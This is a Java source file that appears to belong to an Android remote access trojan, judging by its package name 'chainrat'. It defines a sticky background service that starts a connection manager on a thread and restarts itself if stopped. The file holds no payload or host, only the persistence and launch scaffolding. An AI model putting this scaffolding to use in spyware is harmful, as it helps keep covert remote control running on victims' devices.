package com.nefi.chainrat;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;


public class MainService extends Service {
    private static Context contextOfApplication;

    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }



    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2){
        contextOfApplication = this;
        Log.d("MainService", "Trying to start");

        final Thread thread = new Thread(new Runnable() {

            @Override
            public void run() {
                try  {
                    ConnectionManager.startAsync(contextOfApplication);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        thread.start();
        Log.d("MainService", "Endlich geschafft, der Service läuft der Service ist ready :)");
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }


}